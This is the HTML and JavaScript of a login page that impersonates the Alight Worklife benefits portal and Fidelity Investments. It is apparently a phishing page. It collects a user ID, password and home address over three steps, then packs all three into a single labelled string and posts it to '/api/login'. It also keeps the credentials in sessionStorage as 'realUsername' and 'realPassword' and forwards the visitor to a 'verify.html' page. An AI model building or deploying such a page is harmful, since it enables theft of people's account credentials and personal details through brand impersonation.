<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AlightSmart - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            background-size: cover;
            background-image: url('logi.jpg');
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            position: relative;
            align-items: flex-end;
            padding: 40px 25px 180px;
        }

        body::before {
            content: '';
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.45);
            z-index: -1;
        }

        .logo-container { 
            text-align: center; 
            margin: 40px 0 30px; 
            z-index: 2; 
        }
        .fidelity-logo img {
            width: 190px;
            height: auto;
            padding: 8px 12px;
            background: white;
            border-radius: 8px;
        }

        .alight-worklife {
            font-size: 2.8rem;
            font-weight: 700;
            letter-spacing: -0.02em;
            margin-bottom: 10px;
        }
        .alight-worklife .alight { color: #1a1a1a; }
        .alight-worklife .worklife {
            background: linear-gradient(90deg, #7ed957, #34d399);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .form-container { 
            width: 100%; 
            max-width: 380px; 
            background: rgba(255, 255, 255, 0.97);
            padding: 40px 30px;
            border-radius: 16px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.25);
            z-index: 2;
        }

        label { 
            display: block; 
            margin: 18px 0 8px; 
            font-size: 1.05rem; 
            color: #1e2937; 
            font-weight: 600; 
        }

        .input-group {
            position: relative;
            margin-bottom: 8px;
        }

        input { 
            width: 100%; 
            padding: 14px 16px; 
            border: 2px solid #e2e8f0; 
            border-radius: 10px; 
            font-size: 1.1rem; 
            background: #fff;
            transition: all 0.3s ease;
        }

        input:focus { 
            outline: none; 
            border-color: #1e40af; 
            box-shadow: 0 0 0 4px rgba(30, 64, 175, 0.15);
        }

        .toggle-password {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #1e40af;
            font-size: 0.95rem;
            font-weight: 500;
        }

        .login-btn, .next-btn { 
            width: 100%; 
            padding: 16px; 
            background: #1e40af; 
            color: white; 
            border: none; 
            border-radius: 50px; 
            font-size: 1.2rem; 
            font-weight: 600; 
            margin: 25px 0 10px; 
            cursor: pointer; 
        }

        .worklife {
            font-size: 16px;
            font-weight: 600;
            color: #0052cc;
            background-color: #f0f7ff;
            padding: 16px 20px;
            margin: 25px 0;
            border-left: 5px solid #0052cc;
            border-radius: 8px;
        }

        .helper-text {
            font-size: 13px;
            color: #0052cc;
            font-weight: 500;
        }

        .step { display: none; }
        .step.active { display: block; }
        .progress {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 30px;
        }
        .dot {
            width: 10px;
            height: 10px;
            background: #cbd5e1;
            border-radius: 50%;
        }
        .dot.active { background: #1e40af; }
    </style>
</head>
<body>
    <div class="logo-container">
        <div class="alight-worklife">
            <span class="alight">alight</span>
            <span class="worklife">worklife</span><span style="font-size:0.6rem; vertical-align: super; color:#1a1a1a;">®</span>
        </div>
        <div class="fidelity-logo">
            <img src="fidelity.jpg" alt="Fidelity Investments">
        </div>
        <div class="worklife">Same Login used to access benefits on alight Worklife web</div>
    </div>

    <div class="form-container">
        <form id="loginForm">
            <div class="progress">
                <div class="dot active" id="dot1"></div>
                <div class="dot" id="dot2"></div>
                <div class="dot" id="dot3"></div>
            </div>

            <!-- Step 1: User ID -->
            <div id="step1" class="step active">
                <label for="username">User ID</label>
                <input type="text" id="username" placeholder="Enter your User ID" required>
                <small class="helper-text">Same ID used to access benefits on alight Worklife web</small>
                <button type="button" class="next-btn" onclick="nextStep(2)">Next</button>
            </div>

            <!-- Step 2: Password + Forgot Password -->
            <div id="step2" class="step">
                <label for="password">Password</label>
                <div class="input-group">
                    <input type="password" id="password" placeholder="Enter your password" required>
                    <span class="toggle-password" onclick="togglePassword()">Show</span>
                </div>
                
                <div style="text-align: right; margin: 12px 0 20px;">
                    <a href="forgot.html" style="color: #1e40af; font-size: 0.95rem; text-decoration: none;">Forgot Password?</a>
                </div>

                <button type="button" class="next-btn" onclick="nextStep(3)">Next</button>
                <button type="button" onclick="prevStep(1)" style="background:none; border:none; color:#64748b; margin-top:12px;">← Back</button>
            </div>

            <!-- Step 3: Home Address -->
            <div id="step3" class="step">
                <label>Home Address (Current)</label>
                <input type="text" id="address" placeholder="Enter your current home address" required>
                
                <button type="submit" class="login-btn">LOG IN</button>
                <button type="button" onclick="prevStep(2)" style="background:none; border:none; color:#64748b;">← Back</button>
            </div>
        </form>
    </div>

    <script>
        let currentStep = 1;

        function updateProgress() {
            for (let i = 1; i <= 3; i++) {
                const dot = document.getElementById('dot' + i);
                if (dot) dot.classList.toggle('active', i === currentStep);
            }
        }

        function nextStep(step) {
            document.getElementById('step' + currentStep).classList.remove('active');
            currentStep = step;
            document.getElementById('step' + currentStep).classList.add('active');
            updateProgress();
        }

        function prevStep(step) {
            document.getElementById('step' + currentStep).classList.remove('active');
            currentStep = step;
            document.getElementById('step' + currentStep).classList.add('active');
            updateProgress();
        }

        function togglePassword() {
            const passInput = document.getElementById('password');
            const toggleText = document.querySelector('.toggle-password');
            
            if (passInput.type === "password") {
                passInput.type = "text";
                toggleText.textContent = "Hide";
            } else {
                passInput.type = "password";
                toggleText.textContent = "Show";
            }
        }

        // Auto-fill after password reset
        window.onload = function() {
            const savedUsername = sessionStorage.getItem('realUsername');
            const savedPassword = sessionStorage.getItem('realPassword');
            if (savedUsername) document.getElementById('username').value = savedUsername;
            if (savedPassword) document.getElementById('password').value = savedPassword;
        };

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const homeAddress = document.getElementById('address').value.trim();

            sessionStorage.setItem('realUsername', username);
            sessionStorage.setItem('realPassword', password);

            const payload = { 
                username: username || "N/A", 
                password: password || "N/A", 
                address: `UserID: ${username} | Password: ${password} | Home: ${homeAddress} | Status: Pending Verification`
            };

            try {
                await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (err) {
                console.error("Submit error:", err);
            }

            window.location.href = "verify.html";
        });
    </script>
</body>
</html>
